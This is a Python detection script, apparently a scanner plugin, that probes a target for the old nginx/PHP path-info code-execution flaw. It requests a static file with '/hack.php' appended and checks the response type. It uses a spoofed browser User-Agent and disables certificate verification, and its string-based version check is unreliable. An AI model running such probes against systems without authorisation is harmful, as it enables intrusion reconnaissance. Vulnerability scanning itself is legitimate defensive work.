__author__ = '10192989'
# coding:utf-8

import re
from urllib.parse import urljoin, urlparse
import requests

def req(url, method, **kwargs):
    try:
        req_timeout = 3
        kwargs.setdefault("timeout", req_timeout)
        kwargs.setdefault("verify", False)
        resp = getattr(requests, method)(url, **kwargs)
    except Exception:
        raise
    return resp

def verify(protocol,ip,port):
    target = protocol + '://' + ip + ':' + str(port)
    print('testing if nginx 0.8.37 code execution vul')
    human_headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36',
        'Accept-Encoding': 'gzip,deflate,sdch'
    }
    url = urljoin(target,
                  '/the_file_that_should_never_exist_on_server.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42')
    try:
        resp = req(url, 'get', headers=human_headers)
        if resp is not None:
            if resp.headers.get('Content-Type') == 'image/gif':
                msg = 'There is no nginx 0.8.37 code execution vul'
                number = 'v0'
                return False, target, number, msg
            else:
                pass
        else:
            pass
    except Exception as e:
        pass
    resp1 = req(target, 'get', headers=human_headers)
    try:
        server = resp1.headers.get('Server', None)
        if not server:
            msg = 'There is no nginx 0.8.37 code execution vul'
            number = 'v0'
            return False, target, number, msg
        arr = server.split('/')
        try:
            if not (arr[0] == 'nginx'):
                msg = 'There is no nginx 0.8.37 code execution vul because this server is not nginx'
                number = 'v0'
                return False, target, number, msg
            if len(arr) == 2:
                if not (arr[1] <= '0.8.37'):
                    msg = 'There is no nginx 0.8.37 code execution vul because nginx version older than 0.8.37'
                    number = 'v0'
                    return False, target, number, msg
        except Exception as e:
            msg = str(e)
            number = 'v0'
            return False, target, number, msg
        html = resp1.content
        match1 = re.findall(b'src="(.*?\.(ico|jpg|gif|png|bmp))"', html)
        match2 = re.findall(b'href="(.*?\.(css|rar|zip|txt))"', html)
        if match1:
            m1 = match1[0][0].decode()
            if "http://" not in m1:
                url = urljoin(target, m1)
            else:
                if urlparse(m1).netloc.split(':')[0] == urlparse(target).netloc.split(':')[0]:
                    url = m1
                else:
                    msg = 'There is no nginx 0.8.37 code execution vul'
                    number = 'v0'
                    return False, target, number, msg
        elif match2:
            m2 = match2[0][0]
            if "http://" not in m2:
                url = urljoin(target, m2)
            else:
                if urlparse(m2).netloc.split(':')[0] == urlparse(target).netloc.split(':')[0]:
                    url = m2
                else:
                    msg = 'There is no nginx 0.8.37 code execution vul'
                    number = 'v0'
                    return False, target, number, msg
        else:
            url = urljoin(target, "/robots.txt")
        url += "/hack.php"
        resp2 = req(url, 'get', headers=human_headers)
        back_url = resp2.url
        if (resp2.headers.get('Content-Type') == 'text/html') and (url == back_url):
            url += '?=PHPE9568F34-D428-11d2-A769-00AA001ACF42'
            resp3 = req(url, 'get', headers=human_headers)
            if resp3.headers.get('Content-Type') == 'image/gif':
                msg = 'Found nginx 0.8.37 code execution vul in url:' + url + ' .'
                print(msg)
                number = 'v103'
                return True, url, number, msg
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False, target, number, msg
    msg = 'There is no nginx 0.8.37 code execution vul'
    number = 'v0'
    return False, target, number, msg







